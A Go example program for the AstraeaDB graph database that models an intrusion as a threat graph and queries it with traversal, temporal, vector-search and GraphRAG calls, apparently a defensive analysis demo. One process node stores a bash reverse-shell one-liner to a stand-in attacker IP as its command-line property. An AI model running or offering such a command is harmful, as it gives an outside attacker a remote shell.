// Command cybersecurity demonstrates a threat analysis workflow using
// AstraeaDB's graph traversal, temporal queries, and GraphRAG capabilities.
//
// This example models a cybersecurity threat graph with hosts, processes,
// and network connections, then uses AstraeaDB features to investigate
// a potential lateral movement chain.
//
// Prerequisites:
//
//	AstraeaDB server running on localhost with default ports.
//
// Usage:
//
//	go run .
package main

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/AstraeaDB/R-AstraeaDB"
)

func main() {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	// ── Connect ──────────────────────────────────────────────────────────
	client := astraeadb.NewClient(
		astraeadb.WithAddress("127.0.0.1", 7687),
		astraeadb.WithTimeout(15 * time.Second),
	)
	if err := client.Connect(ctx); err != nil {
		log.Fatalf("Connect: %v", err)
	}
	defer client.Close()

	fmt.Println("=== AstraeaDB Cybersecurity Demo ===")
	fmt.Println()

	// ── Build threat graph ───────────────────────────────────────────────
	// Embeddings represent semantic meaning (simplified 4-dim vectors).
	hostEmbed := []float32{0.9, 0.1, 0.1, 0.0}
	processEmbed := []float32{0.1, 0.9, 0.1, 0.0}
	malwareEmbed := []float32{0.1, 0.1, 0.9, 0.8}

	webServer, _ := client.CreateNode(ctx, []string{"Host"}, map[string]any{
		"hostname": "web-prod-01",
		"ip":       "10.0.1.10",
		"os":       "Ubuntu 22.04",
	}, hostEmbed)

	dbServer, _ := client.CreateNode(ctx, []string{"Host"}, map[string]any{
		"hostname": "db-prod-01",
		"ip":       "10.0.2.20",
		"os":       "Ubuntu 22.04",
	}, hostEmbed)

	attacker, _ := client.CreateNode(ctx, []string{"Host", "External"}, map[string]any{
		"hostname": "unknown",
		"ip":       "198.51.100.42",
	}, hostEmbed)

	sshd, _ := client.CreateNode(ctx, []string{"Process"}, map[string]any{
		"name": "sshd",
		"pid":  1234,
	}, processEmbed)

	revShell, _ := client.CreateNode(ctx, []string{"Process", "Suspicious"}, map[string]any{
		"name":     "bash",
		"pid":      5678,
		"cmdline":  "bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
		"severity": "critical",
	}, malwareEmbed)

	fmt.Printf("Created %d nodes in threat graph\n", 5)

	// Temporal edges: connections have validity windows (epoch ms).
	t1 := time.Date(2025, 1, 15, 14, 0, 0, 0, time.UTC).UnixMilli()
	t2 := time.Date(2025, 1, 15, 14, 5, 0, 0, time.UTC).UnixMilli()
	t3 := time.Date(2025, 1, 15, 14, 6, 0, 0, time.UTC).UnixMilli()

	client.CreateEdge(ctx, attacker, webServer, "SSH_LOGIN",
		astraeadb.WithProperties(map[string]any{"port": 22, "user": "admin"}),
		astraeadb.WithValidFrom(t1),
		astraeadb.WithValidTo(t2),
	)

	client.CreateEdge(ctx, webServer, sshd, "SPAWNED",
		astraeadb.WithValidFrom(t1),
	)

	client.CreateEdge(ctx, sshd, revShell, "SPAWNED",
		astraeadb.WithProperties(map[string]any{"suspicious": true}),
		astraeadb.WithValidFrom(t2),
	)

	client.CreateEdge(ctx, revShell, attacker, "CONNECTS_TO",
		astraeadb.WithProperties(map[string]any{"port": 4444}),
		astraeadb.WithValidFrom(t2),
	)

	client.CreateEdge(ctx, webServer, dbServer, "NETWORK_FLOW",
		astraeadb.WithProperties(map[string]any{"port": 5432, "bytes": 1048576}),
		astraeadb.WithValidFrom(t3),
	)

	fmt.Printf("Created temporal edges with validity windows\n\n")

	// ── Investigation 1: BFS from attacker ───────────────────────────────
	fmt.Println("--- Investigation: BFS from attacker ---")
	bfs, err := client.BFS(ctx, attacker, 4)
	if err != nil {
		log.Fatalf("BFS: %v", err)
	}
	for _, entry := range bfs {
		fmt.Printf("  depth=%d node=%d\n", entry.Depth, entry.NodeID)
	}

	// ── Investigation 2: Shortest path attacker → db ─────────────────────
	fmt.Println("\n--- Shortest path: attacker → database ---")
	path, err := client.ShortestPath(ctx, attacker, dbServer, false)
	if err != nil {
		log.Fatalf("ShortestPath: %v", err)
	}
	if path.Found {
		fmt.Printf("  Path (length=%d): %v\n", path.Length, path.Path)
	} else {
		fmt.Println("  No path found")
	}

	// ── Investigation 3: Temporal query ──────────────────────────────────
	fmt.Println("\n--- Temporal: web server neighbors at t=14:03 ---")
	midpoint := time.Date(2025, 1, 15, 14, 3, 0, 0, time.UTC).UnixMilli()
	temporal, err := client.NeighborsAt(ctx, webServer, "both", midpoint)
	if err != nil {
		log.Fatalf("NeighborsAt: %v", err)
	}
	fmt.Printf("  Found %d active neighbor(s) at that timestamp\n", len(temporal))

	// ── Investigation 4: Vector search for similar threats ───────────────
	fmt.Println("\n--- Vector search: find nodes similar to malware ---")
	results, err := client.VectorSearch(ctx, malwareEmbed, 3)
	if err != nil {
		log.Fatalf("VectorSearch: %v", err)
	}
	for _, r := range results {
		fmt.Printf("  node=%d score=%.3f\n", r.NodeID, r.Score)
	}

	// ── Investigation 5: GraphRAG ────────────────────────────────────────
	fmt.Println("\n--- GraphRAG: threat analysis ---")
	rag, err := client.GraphRAG(ctx,
		"What is the attack chain from the external attacker to the database server?",
		astraeadb.WithAnchor(attacker),
		astraeadb.WithRAGHops(4),
		astraeadb.WithRAGMaxNodes(20),
	)
	if err != nil {
		log.Fatalf("GraphRAG: %v", err)
	}
	fmt.Printf("  Anchor: node %d\n", rag.AnchorNodeID)
	fmt.Printf("  Context: %d nodes, %d edges (~%d tokens)\n",
		rag.NodesInContext, rag.EdgesInContext, rag.EstimatedTokens)
	if len(rag.Context) > 200 {
		fmt.Printf("  Context preview: %s...\n", rag.Context[:200])
	} else {
		fmt.Printf("  Context: %s\n", rag.Context)
	}

	// ── Cleanup ──────────────────────────────────────────────────────────
	fmt.Println("\n--- Cleanup ---")
	for _, id := range []uint64{webServer, dbServer, attacker, sshd, revShell} {
		client.DeleteNode(ctx, id)
	}
	fmt.Println("Done! Threat graph cleaned up.")
}
